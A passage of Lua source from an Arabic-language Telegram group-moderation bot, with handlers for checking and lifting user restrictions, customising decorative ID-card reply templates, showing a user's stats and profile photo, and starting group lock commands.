if DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevJoker:sismember(BlAcK..'Joker:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevJoker:sismember(BlAcK..'Joker:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevJoker:sismember(BlAcK..'Joker:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevJoker:sismember(BlAcK..'Joker:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevJoker:sismember(BlAcK..'Joker:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevJoker:sismember(BlAcK..'Joker:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevJoker:sismember(BlAcK..'Joker:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevJoker:sismember(BlAcK..'Joker:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_,result.sender_user_id_) DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_,result.sender_user_id_) DevJoker:srem(BlAcK..'Joker:BanAll:',result.sender_user_id_) DevJoker:srem(BlAcK..'Joker:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_,result.sender_user_id_) DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","᥀︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_,user) DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_,user) DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_,user) DevJoker:srem(BlAcK..'Joker:BanAll:',user) DevJoker:srem(BlAcK..'Joker:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_,user) DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_,user) DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_,result.id_) DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_,result.id_) DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_,result.id_) DevJoker:srem(BlAcK..'Joker:BanAll:',result.id_) DevJoker:srem(BlAcK..'Joker:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_,result.id_) DevJoker:srem(BlAcK..'Joker:Ban:'..msg.chat_id_,result.id_) DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source BlAcK     --
if Manager(msg) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
᥀︙𝐔𝐒𝐄𝐑 ↬ #username 
᥀︙𝐈𝐃 ↬ #id
᥀︙𝐒𝐓𝐀𝐒𝐓 ↬ #stast
᥀︙𝐀𝐔𝐓𝐎 ↬ #cont 
᥀︙𝐌𝐀𝐒𝐆 ↬ #msgs
᥀︙𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
- ɢᴀᴍᴇ ➥• #game .
]]}
local Text_Rand = List[math.random(#List)]
DevJoker:set(BlAcK.."Joker:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم تغير كليشة الايدي")  
end
--     Source BlAcK     --
if SecondSudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevJoker:set("BlAcK:New:id:"..BlAcK..msg.sender_user_id_,'BlAcKTeam')
return "BlAcKTeam"
end
if text and DevJoker:get("BlAcK:New:id:"..BlAcK..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevJoker:del("BlAcK:New:id:"..BlAcK..msg.sender_user_id_)
return false
end
DevJoker:del("BlAcK:New:id:"..BlAcK..msg.sender_user_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevJoker:set(BlAcK.."Joker:AllIds:Text",text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي العامه")  
DevJoker:del(BlAcK.."Joker:AllIds:Text")
end
end
--     Source BlAcK     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevJoker:set("BlAcK:New:id:"..BlAcK..msg.chat_id_..msg.sender_user_id_,'BlAcKTeam')
return "BlAcKTeam"
end
if text and Manager(msg) and DevJoker:get("BlAcK:New:id:"..BlAcK..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevJoker:del("BlAcK:New:id:"..BlAcK..msg.chat_id_..msg.sender_user_id_)
return false
end
DevJoker:del("BlAcK:New:id:"..BlAcK..msg.chat_id_..msg.sender_user_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الكليشه الجديده', 1, 'md')
DevJoker:set(BlAcK.."Joker:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي")  
DevJoker:del(BlAcK.."Joker:GpIds:Text"..msg.chat_id_)
end
end
--     Source BlAcK     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function BlAcKTeam(extra,Joker,success)
if Joker.username_ then username = '@'..Joker.username_ else username = 'لا يوجد' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
local function getpro(extra, Joker, success) 
local msgsday = DevJoker:get(BlAcK..'Joker:UsersMsgs'..BlAcK..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevJoker:get(BlAcK..'Joker:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevJoker:get(BlAcK..'Joker:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {""}
local Description = Texting[math.random(#Texting)]
if Joker.photos_[0] then
if not DevJoker:get(BlAcK..'Joker:Lock:Id'..msg.chat_id_) then 
if not DevJoker:get(BlAcK..'Joker:Lock:Id:Photo'..msg.chat_id_) then 
if DevJoker:get(BlAcK.."Joker:AllIds:Text") then
newpicid = DevJoker:get(BlAcK.."Joker:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(Joker.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "᥀︙"..Description.."\n᥀︙معرفك ↫ ❨ "..username.." ❩\n᥀︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n᥀︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n᥀︙تفاعلك ↫ "..formsgs(msguser).."\n᥀︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or BLACK_TEAM_4}}}
end 
if not DevJoker:get(BlAcK.."Joker:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Joker.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevJoker:get(BlAcK.."Joker:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(Joker.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Joker.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevJoker:get(BlAcK.."Joker:AllIds:Text") then
newallid = DevJoker:get(BlAcK.."Joker:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newallid = newallid:gsub('#photos',(Joker.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "᥀︙معرفك ↫ ❨ "..username.." ❩\n᥀︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n᥀︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n᥀︙تفاعلك ↫ "..formsgs(msguser).."\n᥀︙نقاطك ↫ ❨ "..user_nkt.." ❩"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or BLACK_TEAM_4}}}
end 
if not DevJoker:get(BlAcK.."Joker:GpIds:Text"..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevJoker:get(BlAcK.."Joker:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(Joker.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_Joker(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عذرا الايدي معطل ', 1, 'md')
end
else
if DevJoker:get(BlAcK.."Joker:AllIds:Text") then
notpicid = DevJoker:get(BlAcK.."Joker:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(Joker.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "᥀︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙معرفك ↫ ❨ "..username.." ❩\n᥀︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n᥀︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n᥀︙تفاعلك ↫ "..formsgs(msguser).."\n᥀︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or BLACK_TEAM_4}}}
end 
if not DevJoker:get(BlAcK..'Joker:Lock:Id'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Lock:Id:Photo'..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙معرفك ↫ ❨ "..username.." ❩\n᥀︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n᥀︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n᥀︙رسائلك ↫ ❨ "..user_msgs.." ❩\n᥀︙تفاعلك ↫ "..formsgs(msguser).."\n᥀︙نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or BLACK_TEAM_4}}}
end
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, BlAcKTeam)
end
end 
--     Source BlAcK     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "التعديل" then
if not DevJoker:get(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التعديل")  
DevJoker:set(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "التعديل الميديا" or LockText[2] == "تعديل الميديا" then
if not DevJoker:get(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل تعديل الميديا")  
DevJoker:set(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه" then
if not DevJoker:get(BlAcK..'Joker:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الفارسيه")  
DevJoker:set(BlAcK..'Joker:Lock:Farsi'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفشار" then
if DevJoker:get(BlAcK..'Joker:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الفشار")  
DevJoker:del(BlAcK..'Joker:Lock:Fshar'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
